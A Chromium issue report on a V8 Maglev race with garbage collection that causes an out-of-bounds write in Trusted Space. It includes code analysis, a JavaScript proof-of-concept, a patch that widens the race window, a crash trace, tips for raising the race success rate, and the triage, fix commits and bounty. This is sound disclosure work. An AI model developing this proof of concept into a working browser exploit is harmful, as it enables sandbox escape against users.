# Race Condition Between Maglev IdentityMap and Mark-Compact GC ThinString Shortcutting Leads to OOB Write in Trusted Space

| Field | Value |
|-------|-------|
| **Issue ID** | [508811474](https://issues.chromium.org/issues/508811474) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2026-05-02 |
| **Bounty** | $500.00 |

## Description

## DETAILS

Although this is a Maglev vulnerability, it is not an optimization logic bug. Instead, it is a race condition between `IdentityMap` and GC in Maglev.

Below are the details.

### 1. IdentityMap

`IdentityMap` implements a `HeapObject Ptr => uintptr_t` mapping. When GC relocates objects, it iterates through the pointers stored in `keys_` and sets `invalidated_ = true`, so that the next lookup or insertion triggers a `Rehash()` operation.

```
class V8_EXPORT_PRIVATE IdentityMapBase : public GCRootsProvider {
  ...
  base::hash<uintptr_t> hasher_;
  Heap* heap_;
  bool invalidated_;    // Set to true by GC; once true, Rehash() is required
  int size_;
  int capacity_;
  int mask_;
  Address* keys_;       // Array storing keys (i.e., HeapObject pointers)
  uintptr_t* values_;   // Array storing values (must be castable to uintptr_t)
  bool is_iterable_;
};

```

During `Rehash()`, all misplaced keys are collected first, then `InsertKey()` is called to re-insert them. If `InsertKey()` encounters a duplicate key, the insertion is skipped.

Therefore, **if duplicate pointers appear in `IdentityMapBase::keys_` after GC, the duplicates will be discarded after `Rehash()`**.

```
void IdentityMapBase::Rehash() {
  // Cannot Rehash during MarkCompact or while iterable
  DCHECK_NE(heap_->gc_state(), Heap::MARK_COMPACT);
  CHECK(!is_iterable());  // Can't rehash while iterating.

  // Mark as valid
  invalidated_ = false;

  // Save key-value pairs that need to be relocated
  std::vector<std::pair<Address, uintptr_t>> reinsert;

  // Find keys with incorrect hash positions and collect them for relocation
  int last_empty = -1;
  Address not_mapped = ReadOnlyRoots(heap_).not_mapped_symbol().ptr();
  for (int i = 0; i < capacity_; i++) {    // Iterate all entries
    if (keys_[i] == not_mapped) {    // Empty slot
      last_empty = i;
    } else {    // Non-empty slot
      // keys_[i] is the new object address; recompute correct position by hash
      int pos = Hash(keys_[i]) & mask_;
      if (pos <= last_empty || pos > i) {
        // Entries at wrong positions need to be moved
        reinsert.push_back(std::pair<Address, uintptr_t>(keys_[i], values_[i]));
        // Remove from keys_ and values_
        keys_[i] = not_mapped;
        values_[i] = 0;
        last_empty = i;
        // Decrement entry count
        size_--;
      }
    }
  }

  // Re-insert the misplaced key-value pairs
  for (auto pair : reinsert) {
    int index = InsertKey(pair.first, Hash(pair.first)).first;
    DCHECK_GE(index, 0);
    values_[index] = pair.second;
  }
}

```
### 2. Shortcut Strings

During Mark-Compact GC, there is a `shortcut_strings_` optimization: if a slot holds a pointer to a `ThinString` object, it is replaced with the `ThinString::actual` pointer.

```
  inline bool TryEvacuateWithoutCopy(Tagged<HeapObject> object) {
    DCHECK(!is_incremental_marking_);

    if (!shortcut_strings_) return false;

    Tagged<Map> map = object->map();

    // Some objects can be evacuated without creating a copy.
    if (map->visitor_id() == kVisitThinString) {    // If it is a ThinString
      // Get the actual string that ThinString points to
      Tagged<HeapObject> actual = Cast<ThinString>(object)->unchecked_actual();
      // If actual also needs evacuation, skip the optimization
      if (MarkCompactCollector::IsOnEvacuationCandidate(actual)) return false;
      // Replace the ThinString pointer directly with the actual pointer
      object->set_map_word_forwarded(actual, kRelaxedStore);
      return true;
    }
    // TODO(mlippautz): Handle ConsString.

    return false;
  }

```

**If an `IdentityMap` contains multiple `ThinString` objects whose `actual` pointers are identical, Mark-Compact GC will cause an unexpected side effect on the `IdentityMap`**: after `Rehash()`, the `size` of the `IdentityMap` decreases, as entries with now-identical keys are merged.

### 3. Maglev Code Gen

Next, I will explain how the above side effect leads to a crash.

`MaglevFrameTranslationBuilder` is responsible for describing how to reconstruct an Ignition frame at a deoptimization point. It records information such as: "Ignition register `r_x` should be set to Maglev value node `n_y`."

If the Maglev value node is a constant node, `GetDeoptLiteral()` is called to record the constant in `deopt_literals_` and assign an ID. This ID can later be used to retrieve the pointer.

```
class MaglevFrameTranslationBuilder {
  int GetDeoptLiteral(Tagged<Object> obj) {
    IdentityMapFindResult<int> res = deopt_literals_->FindOrInsert(obj);
    if (!res.already_exists) {
      DCHECK_EQ(0, *res.entry);
      *res.entry = deopt_literals_->size() - 1;
    }
    return *res.entry;
  }

  IdentityMap<int, base::DefaultAllocationPolicy>* deopt_literals_;
  ...
}

```

Here is an example: `GenericNegate` is a deoptimization point, where `r2:n19:[constant:v-1]` indicates that node `n19` should be written to register `r2` upon deoptimization. `n19` is a constant node, so `GetDeoptLiteral(0x09b80104c641)` is called to record the pointer in `deopt_literals_`.

```
    4/19: Constant(0x09b80104c641 <String[4]: >"2512">) -> v-1, live range: [4-24]
      
    23/20: GenericNegate [v11/n2:[rax|R|t]] -> [rax|R|t], live range: [23-24]
                    input locations: 0x3a400f5c668 (6 slots)
                   -> lazy @9 : {<closure>:n3:[constant:v-1], <this>:n1:[stack:-6|t], a0:n2:[stack:-7|t], <context>:n4:[constant:v-1], r0:n11:[stack:0|t], r2:n19:[constant:v-1]} (addr:0x3a400f5a1a8)
            24/21: CallBuiltin(KeyedStoreIC_Megamorphic) [v15/n11:[rdx|R|t], v4/n19:[rcx|R|t], v23/n20:[rax|R|t], v3/n4:[rsi|R|t]] -> [rax|R|t]
                    input locations: 0x3a400f5c6c8 (5 slots)
                    -> lazy @11 : {<closure>:n3:[constant:v-1], <this>:n1:[stack:-6|t], a0:n2:[stack:-7|t], <context>:n4:[constant:v-1], r0:n11:[stack:0|t]} (addr:0x3a400f5a390)

```

The ID assignment algorithm in `deopt_literals_` is `*res.entry = deopt_literals_->size() - 1`. **This algorithm is only correct under the assumption that `deopt_literals_` never shrinks. Once `deopt_literals_` contracts, some previously assigned IDs that exceed the new size will no longer map to valid entries.**

This is exactly what happens in the PoC. After each `BuildLazyDeopt()` processes a deoptimization point, `heap()->Safepoint()` is called to enter a safe point. At each safe point, the main thread may execute a Mark-Compact GC, which can cause `deopt_literals_` to shrink.

```
bool MaglevCodeGenerator::EmitDeopts() {
  ...
  __ RecordComment("-- Lazy deopts");
  int last_updated_safepoint = 0;
  for (LazyDeoptInfo* deopt_info : code_gen_state_.lazy_deopts()) {
    local_isolate_->heap()->Safepoint();
    translation_builder.BuildLazyDeopt(deopt_info);
    ...
  }
  ...
}

```

Finally, execution reaches `MaglevCodeGenerator::GenerateDeoptimizationData()`. As shown below, `literals` is created with size `deopt_literals_.size()`, and the stored IDs are used as indices when writing into it. When `deopt_literals_` has shrunk, `size <= max ID`, resulting in an out-of-bounds write.

```
Handle<DeoptimizationData> MaglevCodeGenerator::GenerateDeoptimizationData(
    LocalIsolate* local_isolate) {
  ...

  // Create the literal array with size deopt_literals_.size()
  DirectHandle<DeoptimizationLiteralArray> literals =
      local_isolate->factory()->NewDeoptimizationLiteralArray( 
          static_cast<uint32_t>(deopt_literals_.size()));
  ...

  // Write into the literal array
  Tagged<DeoptimizationLiteralArray> raw_literals = *literals;
  {
    // Copy deopt_literals_ into raw_literals
    IdentityMap<int, base::DefaultAllocationPolicy>::IteratableScope iterate(
        &deopt_literals_);
    for (auto it = iterate.begin(); it != iterate.end(); ++it) {
      raw_literals->set(*it.entry(), it.key());    // <=== Crash here
    }
  }
  ...

  return data;
}

```
### 4. Summary

The overall timing diagram when the crash is triggered is as follows:

```
  Maglev Background Thread                    GC Main Thread
         |                                         |
   1. GetDeoptLiteral("2512")*4                    |
         |  4 ThinStrings "2512" inserted          |
         |  each has a different address           |
         |  assigned idx = 5,6,7,8                 |
         |  deopt_literals_.size = 9               |
         |                                         |
  -------+------- safepoint pause -----------------+---
         |                                         |
         |                                Mark-Compact GC 
         |                           2. TryEvacuateWithoutCopy()
         |                                         |    Shortcut Evacuate ThinStrings:
         |                                         |    no copy, forward to actual
         |                                         |    4 different addrs -> same actual addr
         |                                         |
         |                           3. deopt_literals_.Iterate(): 
         |                                         |    update map keys
         |                                         |    4 keys -> same addr
         |                                         |
         |                           4. deopt_literals_.GCEpilogueInSafepoint():
         |                                         |    invalidated_ = true
         |                                         |
  -------+------- safepoint resume ----------------+---
         |                                         |
    5. FindOrInsert()                              |
         |  invalidated_=true => Rehash()          |
         |  4 duplicate keys merged into 1         |
         |  deopt_literals_ size: 9 => 6           |
         |                                         |
6. GenerateDeoptimizationData():                   |
         |  6.1 allocate `literals`                |
         |  NewDeoptimizationLiteralArray(         |
         |      deopt_literals_.size()             |
         |  )                                      |
         |  literals.size = 6                      |
         |                                         |
         |   6.2 copy                              |
         |  for (it : deopt_literals_) {           |
         |    raw_literals->set(                   |
         |        *it.entry(),  // idx             |
         |        it.key()      // object ptr      |
         |    );                                   |
         |  }                                      |
         |    set(5, ...) ok                       |
         |    set(8, ...) idx 8 >= len 6 -> OOB!   |
         |                                         |

```

This is an extremely subtle vulnerability. The two sides of the race condition:

- Shortcut Strings was introduced on `11/30/2017` in commit `9fbbe2a4743c11c2df7aca3425ed419aa4fb0dcc`.
- `IdentityMap<int, base::DefaultAllocationPolicy> deopt_literals_;` was introduced on `10/19/2022` in commit `3a1ca218b893dcdcce19f2536dc11c51751863a7`.

This means the vulnerability has existed since at least 2022.

This vulnerability provides two powerful primitives:

1. Out-of-bounds write in Trusted Space: `raw_literals` is allocated in Trusted Space, so this OOB write can directly bypass the V8 heap sandbox.
2. Incorrect deoptimization: during deoptimization, the runtime accesses `raw_literals` to retrieve the object corresponding to an ID. This causes an OOB read of `raw_literals`, resulting in deoptimization with an incorrect object.

## REPRODUCE

poc.js:

```
function makeSeqString(bigInt) {
    /*
        BigInt::ToString() allocates a new SeqString every time
        without any caching or deduplication, so multiple SeqString
        objects representing the same string content are created.
    */
    return bigInt.toString();
}

// Create SeqString objects with identical content.
// Note: s0, s1, ... point to different SeqString objects.
let x = 2512n;
let s0 = makeSeqString(x);
let s1 = makeSeqString(x);
let s2 = makeSeqString(x);
let s3 = makeSeqString(x);

// Internalize strings to produce multiple ThinString objects
// that share the same actual pointer.
// In a real exploit, this can be achieved via
// `let o = {}; o[str] = 0;` which enters Runtime_DefineKeyedOwnIC_Miss().
%InternalizeString(s0);
%InternalizeString(s1);
%InternalizeString(s2);
%InternalizeString(s3);

function opt(x) {
    let o = {};
    /*
        This statement compiles to two bytecodes:
            9 : 5d 00             Negate FBV[0]
            11 : 3c f9 f7 01      SetKeyedProperty r0, r2, FBV[1]
        
        Maglev optimization generates the following two nodes:
            23/20: GenericNegate [v11/n2:[rax|R|t]] -> [rax|R|t], live range: [23-24]
                    input locations: 0x3a400f5c668 (6 slots)
                   -> lazy @9 : {<closure>:n3:[constant:v-1], ..., r2:n19:[constant:v-1]}
            24/21: CallBuiltin(KeyedStoreIC_Megamorphic) [v15/n11:[rdx|R|t], ...]
                    -> lazy @11 : {<closure>:n3:[constant:v-1], ..., r0:n11:[stack:0|t]}

        If GenericNegate triggers a lazy deopt, the subsequent
        SetKeyedProperty still needs to access r2. Therefore,
        the deopt frame must restore value node `n19:[constant:v-1]`
        into Ignition register r2.

        n19 is a constant node pointing to a ThinString object:
            4/19: Constant(0x09b80104c641 <String[4]: >"2512">) -> v-1
        So BuildDeoptFrameSingleValue() calls
        `GetDeoptLiteral(*value->Reify(local_isolate_))` to add it
        to `deopt_literals_`.
    */
    o[s0] = -x;

    // Similarly, these insert s1, s2, s3 ThinString pointers into deopt_literals_
    o[s1] = -x;
    o[s2] = -x;
    o[s3] = -x;
    // At this point, deopt_literals_ contains s0, s1, s2, s3:
    // four ThinString objects that share the same actual pointer.
    return o;
}

/* 
    Trigger concurrent Maglev optimization via jit-fuzzing + loop.
    MaglevCompiler::Compile() will execute on a background thread.
*/
for(let i=0; i<40; i++) {
    opt(1234n);
}

// Trigger GC on the main thread to race with the background thread
gc({type: "major"});

```

V8 must be built with a debug configuration. Execute V8 as follows:

```
./d8 \
    --expose-gc \
    --allow-natives-syntax \
    --no-lazy-feedback-allocation \
    --jit-fuzzing \
    ./poc.js

```

This is a race condition vulnerability. When executed directly, the probability of winning the race is less than 1%. To increase the crash probability, V8 needs to be patched by adding a `usleep` call in the `GetDeoptLiteral(Tagged<Object> obj)` function to widen the race window. In practice, this raises the success rate to approximately 20%(I suggest having an LLM generate a script to run this PoC in parallel using multiple threads.).

The PoC can be further refined to increase the race success rate, for example:

1. Having multiple background threads run Maglev optimization jobs concurrently.
2. Adding more deoptimization points to trigger additional `Safepoint() + BuildLazyDeopt()` cycles, thereby widening the race window.

However, due to limited time and resources, I have only been able to demonstrate the existence of this vulnerability and have not pursued further exploitation.

```
diff --git a/src/maglev/maglev-code-generator.cc b/src/maglev/maglev-code-generator.cc
index ebcf443b845..9383a3fdaf0 100644
--- a/src/maglev/maglev-code-generator.cc
+++ b/src/maglev/maglev-code-generator.cc
@@ -6,6 +6,7 @@
 
 #include <algorithm>
 #include <fstream>
+#include <unistd.h>
 
 #include "absl/container/flat_hash_map.h"
 #include "src/base/hashmap.h"
@@ -1724,6 +1725,7 @@ class MaglevFrameTranslationBuilder {
       DCHECK_EQ(0, *res.entry);
       *res.entry = deopt_literals_->size() - 1;
     }
+    usleep(500);
     return *res.entry;
   }

```

This will result in the following crash:

```


#
# Fatal error in ../../src/objects/fixed-array-inl.h, line 160
# Debug check failed: IsInBounds(index).
#
#
#
#FailureMessage Object: 0x7fffee2ebab8
==== C stack trace ===============================

   ./d8(v8::base::debug::StackTrace::StackTrace()+0x29) [0x555565fcec09]
   ./d8(+0x10a75aed) [0x555565fc9aed]
   ./d8(v8::base::PrintStackTraceIfAvailable()+0x14) [0x555565fa4464]
   ./d8(V8_Fatal(char const*, int, char const*, ...)+0x1f9) [0x555565fa4c19]
   ./d8(+0x10a504dc) [0x555565fa44dc]
   ./d8(V8_Dcheck(char const*, int, char const*)+0x4d) [0x555565fa4d1d]
   ./d8(v8::internal::TaggedArrayBase<v8::internal::TrustedWeakFixedArray, v8::internal::TrustedWeakFixedArrayShape, v8::internal::TrustedObject>::set(unsigned int, v8::internal::Tagged<v8::internal::Union<v8::internal::Smi, v8::internal::HeapObject, v8::internal::Weak<v8::internal::HeapObject>>>, v8::internal::WriteBarrierMode)+0x81) [0x555560e6cbb1]
   ./d8(v8::internal::DeoptimizationLiteralArray::set(int, v8::internal::Tagged<v8::internal::Object>)+0x1d5) [0x555560e61305]
   ./d8(v8::internal::maglev::MaglevCodeGenerator::GenerateDeoptimizationData(v8::internal::LocalIsolate*)+0x79c) [0x555560d24e8c]
   ./d8(v8::internal::maglev::MaglevCodeGenerator::BuildCodeObject(v8::internal::LocalIsolate*)+0xb4) [0x555560d240f4]
   ./d8(v8::internal::maglev::MaglevCodeGenerator::Assemble()+0x78) [0x555560d23bb8]
   ./d8(v8::internal::maglev::MaglevCompiler::Compile(v8::internal::LocalIsolate*, v8::internal::maglev::MaglevCompilationInfo*)+0xa89) [0x555560e8d139]
   ./d8(v8::internal::maglev::MaglevCompilationJob::ExecuteJobImpl(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x69) [0x5555610e1759]
   ./d8(v8::internal::OptimizedCompilationJob::ExecuteJob(v8::internal::RuntimeCallStats*, v8::internal::LocalIsolate*)+0x12d) [0x55555f6906cd]
   ./d8(v8::internal::maglev::MaglevConcurrentDispatcher::JobTask::Run(v8::JobDelegate*)+0x1ec) [0x5555610e394c]
   ./d8(v8::platform::DefaultJobWorker::Run()+0xbe) [0x555565fd166e]
   ./d8(v8::platform::DefaultWorkerThreadsTaskRunner::WorkerThread::Run()+0xac) [0x555565fe066c]
   ./d8(v8::base::Thread::Dispatch()+0x16) [0x55555f276e06]
   ./d8(v8::base::Thread::NotifyStartedAndDispatch()+0x32) [0x55555f276d72]
   ./d8(+0x10a6f1b0) [0x555565fc31b0]
    /lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7ffff7f8b609]
    /lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7ffff7d46353]


```

CREDIT INFORMATION

Reporter credit: [303f06e3]

## Timeline

### cl...@google.com (2026-05-04)

This analysis is AI-generated using the `v8-security-triaging` skill (Conversation ID: `868394d6-659d-444b-96e4-122c191a358f`).

### Triage Analysis for [Issue 508811474](https://issues.chromium.org/issues/508811474)

- **Status:** Reproduced (confirmed via code inspection and detailed reporter analysis).
- **Classification:** Vulnerability.
- **Rationale:** The issue is a race condition between Maglev's background compilation and the main thread's Mark-Compact GC. Maglev uses an `IdentityMap` to store deoptimization literals. During GC, `ThinString` shortcutting can cause multiple previously distinct string pointers to become identical. When the `IdentityMap` is next accessed (e.g., via `FindOrInsert` or rehashing), these duplicate keys are merged, causing the map's `size()` to decrease.
  
  Maglev assigns literal IDs based on the map's size at the time of insertion (`*res.entry = deopt_literals_->size() - 1`). If the map shrinks due to a concurrent GC, previously assigned IDs may exceed the new map size. When `MaglevCodeGenerator::GenerateDeoptimizationData` subsequently allocates a `DeoptimizationLiteralArray` with the current (shrunken) size and uses the stored IDs as indices, it performs an out-of-bounds write.
  
  Because `DeoptimizationLiteralArray` is allocated in **Trusted Space**, this OOB write provides a powerful primitive to bypass the V8 heap sandbox by corrupting trusted objects.
- **Security Impact:** Head/Beta/Stable. The vulnerability exists in Maglev, which is enabled by default, and can be triggered by a race between standard JS operations and GC.
- **Severity:** High (S1).
- **Reproduction:** Run `d8` with `--expose-gc --allow-natives-syntax --no-lazy-feedback-allocation --jit-fuzzing`. The race is extremely tight (<1% success rate) without patching V8 to widen the window, but the architectural flaw is clearly visible in `src/maglev/maglev-code-generator.cc`.
- **Proposed Owner:** @leszeks (Leszek Swirski)

### le...@chromium.org (2026-05-04)

This is a very nice catch, thank you for the excellent report.

### le...@chromium.org (2026-05-04)

cc Patrick and Michi as fyi, here's an example of a PITA bug from thin string shortcutting.

### ml...@google.com (2026-05-04)

Nice but report indeed.

### ch...@google.com (2026-05-05)

Setting milestone because of s0/s1 severity.

### dx...@google.com (2026-05-05)

Project: v8/v8  

Branch:  main  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7816278>

[maglev] Fix deopt literals IdentityMap race during GC

---


Expand for full commit details
```
     
    Maglev used an IdentityMap to store deoptimization literals, assigning 
    IDs based on the map's size. During concurrent GC, ThinString 
    shortcutting could merge previously distinct string pointers, causing 
    the map to rehash and shrink. This led to corrupted IDs and subsequent 
    out-of-bounds writes in DeoptimizationLiteralArray. 
     
    This CL implements an optimized hybrid approach: 
    1. Pair the IdentityMap cache with ZoneVectors to preserve original 
       insertion order. 
    2. Populate the DeoptimizationLiteralArray from the vectors. 
    3. Safely canonicalize vector handles using Maglev's persistent 
       CanonicalHandlesMap. 
    4. Optimize compiler::Ref overloads to bypass redundant lookups. 
     
    We also improve V8's runtime testing infrastructure by fixing 
    OptimizeMaglevOnNextCall's registration in runtime.h to support 
    variable arguments, enabling native concurrent Maglev testing in JS. 
     
    A robust randomized concurrent regression test is added to verify. 
     
    TAG=agy 
    CONV=8a5b0da0-ce00-46ee-83f5-9a341372b6f7 
     
    Fixed: 508811474 
    Change-Id: I69bffdbe6736552e273480c8cf23de25af112739 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7816278 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Reviewed-by: Patrick Thier <pthier@chromium.org> 
    Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Patrick Thier <pthier@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107059}

```

---

Files:

- M `src/maglev/maglev-code-generator.cc`
- M `src/maglev/maglev-code-generator.h`
- M `src/runtime/runtime.h`
- A `test/mjsunit/maglev/maglev-508811474.js`

---

Hash: [00f6ecd8a7cca6911789a11b7a7b01aaf41f925b](https://chromiumdash.appspot.com/commit/00f6ecd8a7cca6911789a11b7a7b01aaf41f925b)  

Date: Tue May 5 10:38:04 2026


---

### ch...@google.com (2026-05-20)

Requesting merge to M148 because latest trunk commit is in 150.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Requesting merge to M149 because latest trunk commit is in 150.

### ch...@google.com (2026-05-20)

**M148** merge request created. **Please update [crbug/514925265](https://crbug.com/514925265) to have this merge reviewed.**

### ch...@google.com (2026-05-20)

**M149** merge request created. **Please update [crbug/514928956](https://crbug.com/514928956) to have this merge reviewed.**

### dx...@google.com (2026-05-20)

Project: v8/v8  

Branch:  refs/branch-heads/14.9  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7864503>

[M149] [maglev] Fix deopt literals IdentityMap race during GC

---


Expand for full commit details
```
     
    Original change's description: 
    > [maglev] Fix deopt literals IdentityMap race during GC 
    > 
    > Maglev used an IdentityMap to store deoptimization literals, assigning 
    > IDs based on the map's size. During concurrent GC, ThinString 
    > shortcutting could merge previously distinct string pointers, causing 
    > the map to rehash and shrink. This led to corrupted IDs and subsequent 
    > out-of-bounds writes in DeoptimizationLiteralArray. 
    > 
    > This CL implements an optimized hybrid approach: 
    > 1. Pair the IdentityMap cache with ZoneVectors to preserve original 
    >    insertion order. 
    > 2. Populate the DeoptimizationLiteralArray from the vectors. 
    > 3. Safely canonicalize vector handles using Maglev's persistent 
    >    CanonicalHandlesMap. 
    > 4. Optimize compiler::Ref overloads to bypass redundant lookups. 
    > 
    > We also improve V8's runtime testing infrastructure by fixing 
    > OptimizeMaglevOnNextCall's registration in runtime.h to support 
    > variable arguments, enabling native concurrent Maglev testing in JS. 
    > 
    > A robust randomized concurrent regression test is added to verify. 
    > 
    > TAG=agy 
    > CONV=8a5b0da0-ce00-46ee-83f5-9a341372b6f7 
    > 
    > Fixed: 508811474 
    > Change-Id: I69bffdbe6736552e273480c8cf23de25af112739 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7816278 
    > Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    > Reviewed-by: Patrick Thier <pthier@chromium.org> 
    > Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    > Commit-Queue: Patrick Thier <pthier@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#107059} 
     
    (cherry picked from commit 00f6ecd8a7cca6911789a11b7a7b01aaf41f925b) 
     
    Bug: 514928956,508811474 
    Change-Id: I69bffdbe6736552e273480c8cf23de25af112739 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7864503 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Reviewed-by: Patrick Thier <pthier@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.9@{#20} 
    Cr-Branched-From: 8f08364a351ad38a60421137a09ef23953ecdd56-refs/heads/14.9.207@{#1} 
    Cr-Branched-From: 8de67b11924d5e8c0032029165a52d800cf05f1f-refs/heads/main@{#106999}

```

---

Files:

- M `src/maglev/maglev-code-generator.cc`
- M `src/maglev/maglev-code-generator.h`
- M `src/runtime/runtime.h`
- A `test/mjsunit/maglev/maglev-508811474.js`

---

Hash: [38293d2e92d43a2656fbac59a9af0f37817059ca](https://chromiumdash.appspot.com/commit/38293d2e92d43a2656fbac59a9af0f37817059ca)  

Date: Tue May 5 10:38:04 2026


---

### pe...@google.com (2026-05-20)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### dx...@google.com (2026-05-20)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7864504>

[M148] [maglev] Fix deopt literals IdentityMap race during GC

---


Expand for full commit details
```
     
    Original change's description: 
    > [maglev] Fix deopt literals IdentityMap race during GC 
    > 
    > Maglev used an IdentityMap to store deoptimization literals, assigning 
    > IDs based on the map's size. During concurrent GC, ThinString 
    > shortcutting could merge previously distinct string pointers, causing 
    > the map to rehash and shrink. This led to corrupted IDs and subsequent 
    > out-of-bounds writes in DeoptimizationLiteralArray. 
    > 
    > This CL implements an optimized hybrid approach: 
    > 1. Pair the IdentityMap cache with ZoneVectors to preserve original 
    >    insertion order. 
    > 2. Populate the DeoptimizationLiteralArray from the vectors. 
    > 3. Safely canonicalize vector handles using Maglev's persistent 
    >    CanonicalHandlesMap. 
    > 4. Optimize compiler::Ref overloads to bypass redundant lookups. 
    > 
    > We also improve V8's runtime testing infrastructure by fixing 
    > OptimizeMaglevOnNextCall's registration in runtime.h to support 
    > variable arguments, enabling native concurrent Maglev testing in JS. 
    > 
    > A robust randomized concurrent regression test is added to verify. 
    > 
    > TAG=agy 
    > CONV=8a5b0da0-ce00-46ee-83f5-9a341372b6f7 
    > 
    > Fixed: 508811474 
    > Change-Id: I69bffdbe6736552e273480c8cf23de25af112739 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7816278 
    > Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    > Reviewed-by: Patrick Thier <pthier@chromium.org> 
    > Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    > Commit-Queue: Patrick Thier <pthier@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#107059} 
     
    (cherry picked from commit 00f6ecd8a7cca6911789a11b7a7b01aaf41f925b) 
     
    Bug: 514925265,508811474 
    Change-Id: I69bffdbe6736552e273480c8cf23de25af112739 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7864504 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Reviewed-by: Patrick Thier <pthier@chromium.org> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#50} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/maglev/maglev-code-generator.cc`
- M `src/maglev/maglev-code-generator.h`
- M `src/runtime/runtime.h`
- A `test/mjsunit/maglev/maglev-508811474.js`

---

Hash: [2603f8fbf6cd97a45807bc29b007b8f0a2d0df51](https://chromiumdash.appspot.com/commit/2603f8fbf6cd97a45807bc29b007b8f0a2d0df51)  

Date: Tue May 5 10:38:04 2026


---

### le...@chromium.org (2026-05-20)

> 1. Was this issue a regression for the milestone it was found in?

No

> 2. Is this issue related to a change or feature merged after the latest LTS Milestone?

No

Introduced in ca. M130

### sp...@google.com (2026-05-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $500.00 for this report.

Rationale for this decision:
V8 Logic. Other Processes - Renderer


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-06-12)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-06-12)

1. https://chromium-review.git.corp.google.com/c/v8/v8/+/7923668
2. Low - There were a couple of conflicts.
3. 148 and 149
4. Yes, the bug was introduced in M130.

### dx...@google.com (2026-06-19)

Project: v8/v8  

Branch:  refs/branch-heads/14.4  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7923668>

[M144-LTS][maglev] Fix deopt literals IdentityMap race during GC

---


Expand for full commit details
```
[M144-LTS][maglev] Fix deopt literals IdentityMap race during GC

Maglev used an IdentityMap to store deoptimization literals, assigning
IDs based on the map's size. During concurrent GC, ThinString
shortcutting could merge previously distinct string pointers, causing
the map to rehash and shrink. This led to corrupted IDs and subsequent
out-of-bounds writes in DeoptimizationLiteralArray.

This CL implements an optimized hybrid approach:
1. Pair the IdentityMap cache with ZoneVectors to preserve original
   insertion order.
2. Populate the DeoptimizationLiteralArray from the vectors.
3. Safely canonicalize vector handles using Maglev's persistent
   CanonicalHandlesMap.
4. Optimize compiler::Ref overloads to bypass redundant lookups.

We also improve V8's runtime testing infrastructure by fixing
OptimizeMaglevOnNextCall's registration in runtime.h to support
